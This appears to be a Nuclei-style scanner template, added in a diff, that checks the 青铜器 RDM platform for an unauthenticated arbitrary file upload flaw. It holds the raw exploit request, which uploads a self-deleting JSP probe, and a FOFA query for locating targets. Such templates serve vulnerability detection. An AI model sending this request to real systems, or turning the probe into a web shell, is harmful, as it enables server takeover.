@@ -1,0 +1,51 @@
+http:
+    - extractors:
+        - group: 1
+          internal: true
+          name: uploadfile
+          part: body
+          regex:
+            - ([0-9]+/\w+\.jsp)
+          type: regex
+      matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /upload?dir=cmVwb3NpdG9yeQ==&name=ZGVtby5qc3A=&start=0&size=7000 HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+          Content-Type: multipart/form-data; boundary=00content0boundary00
+
+          --00content0boundary00
+          Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+          Content-Type: application/octet-stream
+
+          <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+          --00content0boundary00
+          Content-Disposition: form-data; name="Submit"
+
+          Go
+          --00content0boundary00--
+        - |
+          GET /repository/{{uploadfile}} HTTP/1.1
+          Host: {{Hostname}}
+id: qingtongqiRDM-upload-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/images/rdm.ico"
+        青铜器RDM研发管理平台 upload 接口处存在任意文件上传漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 青铜器RDM研发管理平台 upload 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/X9aOYcR11YEkOet06vXoSw
+    severity: high
+    tags: []
+variables:
+    username: '{{to_lower(rand_base(6))}}'
